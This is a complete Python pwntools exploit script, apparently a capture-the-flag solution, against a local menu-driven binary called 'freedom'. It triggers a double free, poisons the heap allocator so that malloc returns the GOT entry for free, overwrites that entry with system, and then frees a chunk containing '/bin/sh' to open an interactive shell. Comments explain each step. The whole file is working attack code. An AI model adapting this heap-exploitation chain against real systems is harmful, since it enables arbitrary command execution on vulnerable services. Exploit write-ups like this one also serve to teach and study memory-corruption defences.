#!/usr/bin/env python2
from pwn import *

def loc():
    return process("./freedom")

def rem():
    return remote("localhost", 3007)

def menu():
    return r.recvuntil("Your choice:\n")

def create(n, type):
    menu()
    r.sendline("1")
    r.recvuntil("3):\n")
    r.sendline(str(n))
    r.recvuntil("3):\n")
    r.sendline(str(type))

def rename(n, name):
    menu()
    r.sendline("2")
    r.recvuntil("3):\n")
    r.sendline(str(n))
    r.recvuntil("name:\n")
    r.send(name)

def free(n):
    menu()
    r.sendline("3")
    r.recvuntil("3):\n")
    r.sendline(str(n))

def exit_():
    menu()
    r.sendline("4")

r = rem()
elf = ELF("freedom")

# Create a buffer containing our command. We'll need it later.
create(3, 1)
rename(3, "/bin/sh")

# Trigger a double free.
create(1, 1)
free(1)
free(1)

# Create the first chunk.
create(1, 1)
# Whatever you write here will be the address returned by malloc in 2 calls.
rename(1, p64(elf.got["free"]))

# First call.
create(1, 1)

# Second call. This points to the relocation table for 'free'.
create(2, 1)

# Change the function 'free' for 'system'.
rename(2, p64(elf.plt["system"]))

# Trigger a call to free (which is actually system). Chunk #3 is where we put our command ("/bin/sh").
# So, this ends up calling system("/bin/sh")
free(3)

r.interactive()